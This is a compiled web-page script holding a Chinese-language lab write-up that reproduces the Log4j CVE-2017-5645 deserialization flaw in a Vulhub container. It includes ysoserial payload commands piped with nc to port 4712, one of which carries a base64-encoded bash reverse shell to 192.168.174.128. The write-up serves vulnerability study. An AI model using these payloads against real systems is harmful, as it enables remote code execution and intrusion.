import{_ as t}from"./plugin-vue_export-helper-c27b6911.js";import{r as c,o as i,c as n,a,b as e,d as s,e as o}from"./app-58e4a7d6.js";const d={},l=o(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>Apache Log4j是一个用于Java的日志记录库，其支持启动远程日志服务器。Apache Log4j 2.8.2之前的2.x版本中存在安全漏洞。攻击者可利用该漏洞执行任意代码。</p><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub执行如下命令启动漏洞环境</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>环境启动后，将在4712端口开启一个TCPServer。</p><p>说一下，除了使用vulhub的docker镜像搭建环境外，我们下载了log4j的jar文件后可以直接在命令行启动这个TCPServer：<code>java -cp &quot;log4j-api-2.8.1.jar:log4j-core-2.8.1.jar:jcommander-1.72.jar&quot; org.apache.logging.log4j.core.net.server.TcpSocketServer</code>，无需使用vulhub和编写代码。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>我们使用ysoserial生成payload，然后直接发送给<code>your-ip:4712</code>端口即可。</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections5 &quot;touch /tmp/success&quot; | nc your-ip 4712
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>然后执行<code>docker-compose exec log4j bash</code>进入容器，可见 /tmp/success 已成功创建：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202262115772.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,12),p={href:"http://www.jackson-t.ca/runtime-exec-payloads.html",target:"_blank",rel:"noopener noreferrer"},u=o(`<div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections5 &quot;bash -c {echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMTc0LjEyOC85OTk5IDA+JjE=}|{base64,-d}|{bash,-i}&quot; | nc your-ip 4712
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202262118589.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,2);function h(g,m){const r=c("ExternalLinkIcon");return i(),n("div",null,[l,a("p",null,[e("执行"),a("a",p,[e("反弹shell的命令"),s(r)]),e("，成功弹回shell：")]),u])}const b=t(d,[["render",h],["__file","Apache Log4j Server 反序列化命令执行漏洞 CVE-2017-5645.html.vue"]]);export{b as default};
